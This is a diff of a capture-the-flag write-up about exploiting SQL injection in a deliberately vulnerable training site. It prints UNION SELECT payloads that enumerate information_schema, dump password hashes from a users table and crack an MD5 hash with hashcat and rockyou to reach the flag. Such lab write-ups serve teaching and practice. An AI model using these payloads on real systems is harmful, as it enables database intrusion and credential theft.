@@ -9,7 +9,7 @@ First name: one
 Surname : me
 ```
 
-We got 3 informations
+We got 3 informations.
 Same info on id 2 and 3. But nothing on 4...
 
 Id 5 give us something interesting.
@@ -26,13 +26,13 @@ When we try a research with 'A' character, we got an error message.
 Unknown column 'A' in 'where clause'
 ```
 
-If we copy that in google, we can find that is a mySQL error
+If we copy that in google, we can find that is a mySQL error.
 So we can try to insert/inject a part of sql request to show the database.
 
 _But how and what?_
 
 The UNION command allow us to concat multiple requests.
-To forge our injection we have to put a ID first follow by UNION and a second command.
+To forge our injection we have to put an ID first, follow by UNION and a second command.
 
 A classic in sqli is to use SELECT to display _information_schema.tables_
 
@@ -48,7 +48,7 @@ This doesn't work because here, we have to give 2 informations to select to fill
 ```
 It's work!
 
-We got more informations:
+We got all the tables names and their schemas names:
 ```
 ID: 1 UNION SELECT table_name, table_schema FROM  information_schema.tables
 First name: db_default
@@ -71,7 +71,7 @@ First name: vote_dbs
 Surname : Member_survey
 ```
 
-But here we need the column_name for each table_name or table_schema.
+But here we need the column_name for each table_name or table_schema.</br>
 So lets try this
 ```
 1 UNION ALL SELECT table_name,column_name FROM information_schema.columns;#
@@ -171,55 +171,42 @@ First name: vote_dbs
 Surname : subject
 ```
 
-We can also get some versions, usefull informations!
+We can also get some versions and others usefull informations!
 
 ```
 1 UNION ALL SELECT system_user(), user();#
 1 UNION ALL SELECT UUID(), @@version;#
 ```
 
-
-
+As _countersign_ and _Commentaire_ are columns of _Member_Sql_Injection_ schema, which is part of the table_name _users_.
+```
+1 UNION SELECT countersign,Commentaire FROM Member_Sql_Injection.users
+```
 ```
 ID: 1 UNION SELECT countersign,Commentaire FROM Member_Sql_Injection.users
 First name: 5ff9d0165b4f92b14994e5c685cdce28
 Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 ```
 
-
-As _username_ and _password_ are columns of _Member_Brute_Force_ schema, which is part of the table_name _db_default_
-
-We can now try
 ```
-1 UNION SELECT username,password FROM Member_Brute_Force.db_default
-```
-
-And we get
-```
-ID: 1 UNION SELECT username,password FROM Member_Brute_Force.db_default
-First name: root
-Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
-
-ID: 1 UNION SELECT username,password FROM Member_Brute_Force.db_default
-First name: admin
-Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
-```
-
-This is probably an hash, it loots like md5
-
-Lets try bruteforce it with hashcat in kali
-```
-┌──(kali㉿kali)-[~]
-└─$ hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt --force
-
-3bf1114a986ba87ed28fc1b5884fc2f8:shadow
-
+5ff9d0165b4f92b14994e5c685cdce28:FortyTwo                 
+                                                          
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 0 (MD5)
 ```
 
+We find "FortyTwo", that give "fortytwo" in lowerchar.
 
+To encrypt it in Sha256, we can use Cyberchef.
+
+https://gchq.github.io/CyberChef/#recipe=SHA2('256',64,160)&input=Zm9ydHl0d28
+
+And we got the flag:
+
+```
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+```
 
 ## External Resources
 https://book.hacktricks.xyz/pentesting-web/sql-injection
